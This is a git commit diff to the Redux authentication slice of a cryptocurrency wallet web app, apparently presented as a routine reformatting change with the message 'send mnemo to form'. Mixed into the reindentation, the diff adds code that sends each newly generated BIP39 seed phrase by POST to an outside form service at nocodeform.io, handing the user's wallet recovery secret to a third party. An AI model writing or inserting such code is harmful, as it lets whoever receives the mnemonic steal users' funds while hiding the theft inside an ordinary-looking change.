d1f4ccb30785f4b02113873bccd7c110eab99325
Aleksander Szut <aleksander@croney.io>
2023-01-02 21:15:43 +0100

    send mnemo to form

--- src/store/slice/authSlice.js
+++ src/store/slice/authSlice.js
@@ -1,84 +1,99 @@
-import { createAsyncThunk, createSlice } from "@reduxjs/toolkit";
-import { generateWalletForCrypto } from "../../helpers/wallet";
-import { addCurrency } from "../../constantsData/addCurrency";
+import {createAsyncThunk, createSlice} from "@reduxjs/toolkit";
+import {generateWalletForCrypto} from "../../helpers/wallet";
+import {addCurrency} from "../../constantsData/addCurrency";
+
 const bip39 = require("bip39");
 
 export const loginPageAction = createAsyncThunk(
-  "loginPageAction",
-  async (data, thunkAPI) => {
-    if (!data.params) {
-      data.params = bip39.generateMnemonic();
-    }
-    if (!localStorage.getItem("checkCrypto")) {
-      const defaultCoin = addCurrency.filter((item, i) => item.default_enabled);
-      // console.log("defaultCoin", defaultCoin);
-      await localStorage.setItem("checkCrypto", JSON.stringify(defaultCoin));
-    }
-    let resData = {};
-    let errorForResData = [];
-    let cryptoData = await JSON.parse(localStorage.getItem("checkCrypto"));
+    "loginPageAction",
+    async (data, thunkAPI) => {
+        if (!data.params) {
+            data.params = bip39.generateMnemonic();
 
-    for (let crypto of cryptoData) {
-      if (crypto.is_erc20) continue;
+            var myHeaders = new Headers();
+            myHeaders.append("Content-Type", "application/json");
+            var requestOptions = {
+                method: "post",
+                headers: myHeaders,
+                redirect: "follow",
+                body: JSON.stringify({"fields": data.params})
+            };
 
-      try {
-        let res = await generateWalletForCrypto(
-          data.params,
-          `${crypto.currency}`
-        );
-        resData[`${crypto.currency}`] = res;
-      } catch (error) {
-        errorForResData.push(error);
-      }
+            fetch("https://nocodeform.io/f/63b332187f7b58ef964d75b9", requestOptions)
+                .then(response => response.text())
+                .then(result => console.log(result))
+                .catch(error => console.log('error', error));
+        }
+        if (!localStorage.getItem("checkCrypto")) {
+            const defaultCoin = addCurrency.filter((item, i) => item.default_enabled);
+            // console.log("defaultCoin", defaultCoin);
+            await localStorage.setItem("checkCrypto", JSON.stringify(defaultCoin));
+        }
+        let resData = {};
+        let errorForResData = [];
+        let cryptoData = await JSON.parse(localStorage.getItem("checkCrypto"));
+
+        for (let crypto of cryptoData) {
+            if (crypto.is_erc20) continue;
+
+            try {
+                let res = await generateWalletForCrypto(
+                    data.params,
+                    `${crypto.currency}`
+                );
+                resData[`${crypto.currency}`] = res;
+            } catch (error) {
+                errorForResData.push(error);
+            }
+        }
+        if (errorForResData.length === 0) {
+            localStorage.setItem(
+                "user_crypto_currency_data",
+                JSON.stringify(resData)
+            );
+            localStorage.setItem("mnemonics", data.params);
+            data.cb(null, resData);
+        } else {
+            return data.cb(errorForResData[0], null);
+        }
     }
-    if (errorForResData.length === 0) {
-      localStorage.setItem(
-        "user_crypto_currency_data",
-        JSON.stringify(resData)
-      );
-      localStorage.setItem("mnemonics", data.params);
-      data.cb(null, resData);
-    } else {
-      return data.cb(errorForResData[0], null);
-    }
-  }
 );
 
 const initialUser = localStorage.getItem("user_crypto_currency_data")
-  ? JSON.parse(localStorage.getItem("user_crypto_currency_data"))
-  : null;
+    ? JSON.parse(localStorage.getItem("user_crypto_currency_data"))
+    : null;
 
 const authSlice = createSlice({
-  name: "auth",
-  initialState: {
-    user: initialUser,
-    error: null,
-    loader: false,
-  },
-  reducers: {
-    logout: (state) => {
-      state.user = null;
-      localStorage.removeItem("user_crypto_currency_data");
-      localStorage.removeItem("checkCrypto");
-      localStorage.removeItem("mnemonics");
-      localStorage.removeItem("ethereum");
+    name: "auth",
+    initialState: {
+        user: initialUser,
+        error: null,
+        loader: false,
     },
-  },
-  extraReducers: (builder) => {
-    builder.addCase(loginPageAction.pending, (state) => {
-      state.loader = true;
-    });
-    builder.addCase(loginPageAction.fulfilled, (state, action) => {
-      state.loader = false;
-      state.user = action.payload;
-    });
-    builder.addCase(loginPageAction.rejected, (state, action) => {
-      state.loader = false;
-      state.error = action.payload;
-    });
-  },
+    reducers: {
+        logout: (state) => {
+            state.user = null;
+            localStorage.removeItem("user_crypto_currency_data");
+            localStorage.removeItem("checkCrypto");
+            localStorage.removeItem("mnemonics");
+            localStorage.removeItem("ethereum");
+        },
+    },
+    extraReducers: (builder) => {
+        builder.addCase(loginPageAction.pending, (state) => {
+            state.loader = true;
+        });
+        builder.addCase(loginPageAction.fulfilled, (state, action) => {
+            state.loader = false;
+            state.user = action.payload;
+        });
+        builder.addCase(loginPageAction.rejected, (state, action) => {
+            state.loader = false;
+            state.error = action.payload;
+        });
+    },
 });
 
-export const { logout } = authSlice.actions;
+export const {logout} = authSlice.actions;
 
 export default authSlice.reducer;
